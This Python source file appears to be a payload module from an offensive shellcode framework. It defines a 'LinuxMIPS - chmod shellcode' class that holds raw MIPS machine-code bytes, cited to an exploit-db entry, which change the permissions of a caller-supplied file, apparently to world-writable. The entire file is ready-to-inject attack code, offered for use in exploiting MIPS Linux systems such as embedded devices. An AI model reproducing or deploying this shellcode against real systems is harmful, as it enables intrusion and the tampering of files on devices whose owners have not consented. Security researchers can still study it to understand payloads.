from lib.payloads.shellcode import Shellcode 


class Payload(Shellcode):
    Shellcode.info["author"] = "Sang-Min LEE"
    Shellcode.info["name"] = "LinuxMIPS - chmod shellcode"
    Shellcode.info["references"] = [
        "https://www.exploit-db.com/exploits/36276/"
    ]

    def __init__(self, **kwargs): 
        Shellcode.info["size"] = 44 + Shellcode().getsize(kwargs["file"])
        Shellcode.info["payload"] = [
            r"\xff\xff\x06\x28\xff\xff"
            r"\xd0\x04\xff\xff\x05\x28"
            r"\xb6\x01\x05\x24\x01\x10"
            r"\xe4\x27\x1f\xf0\x84\x24"
            r"\xaf\x0f\x02\x24\x0c\x01"
            r"\x01\x01\xff\xff\x04\x28"
            r"\xa1\x0f\x02\x24\x0c\x01"
            r"\x01\x01"
            + kwargs["file"]
        ]	
